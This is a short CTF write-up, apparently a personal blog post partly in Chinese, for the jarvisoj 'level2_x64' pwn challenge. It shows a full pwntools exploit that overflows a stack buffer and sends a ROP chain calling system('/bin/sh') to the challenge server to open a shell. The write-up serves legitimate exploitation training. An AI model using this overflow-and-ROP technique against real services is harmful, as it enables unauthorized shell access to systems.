---
layout:     post
title:      jarvisoj [XMAN]level2_x64
author:     wooy0ung
tags: 		linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Download:
https://dn.jarvisoj.com/challengefiles/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e

Address:
nc pwn2.jarvisoj.com 9882
```
<!-- more -->


### 0x01 exploit

参考level0的解法，构造system("/bin/sh")

![](/assets/img/ctf/pwn/2017-07-12-jarvisoj-level2_x64/0x00.png)

最终exploit如下

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

junk = 'A' * (0x80 + 0x08)
system_addr = 0x4004C0 # 0x600A78
bin_sh_addr = 0x600A90
pop_rdi_ret = 0x4006b3

Io = remote('pwn2.jarvisoj.com', 9882)

payload = junk + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

Io.send(payload)
Io.interactive()
```

得到flag

![](/assets/img/ctf/pwn/2017-07-12-jarvisoj-level2_x64/0x01.png)